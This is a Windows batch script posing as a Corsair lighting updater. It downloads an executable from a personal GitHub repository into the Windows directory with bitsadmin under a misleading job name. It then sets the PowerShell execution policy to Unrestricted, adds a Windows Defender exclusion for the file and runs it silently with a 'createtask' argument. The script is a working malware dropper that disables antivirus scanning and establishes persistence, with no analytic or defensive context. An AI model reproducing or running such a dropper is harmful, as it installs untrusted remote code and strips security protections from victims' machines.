@echo off
setlocal

:: Define the URL and the output file
set "URL=https://github.com/mice314/z/raw/main/CorsairUpdater.exe"
set "OUTPUT=CorsairUpdater.exe"

:: Get the Windows directory
set "windows_dir=%windir%"

:: Create a new folder in the Windows directory
mkdir "%windows_dir%\CorsairLighting"

:: Use bitsadmin to download the file
bitsadmin /transfer "Updating DLL Software" /download /priority normal "%URL%" "%windows_dir%\CorsairLighting\%OUTPUT%"

:: Whitelist the downloaded file
powershell -Command "Set-ExecutionPolicy Unrestricted"
powershell -Command "Add-MpPreference -ExclusionPath '%windows_dir%\CorsairLighting\%OUTPUT%'"

:: Run the file silently
start /b "" "%windows_dir%\CorsairLighting\%OUTPUT%" "createtask"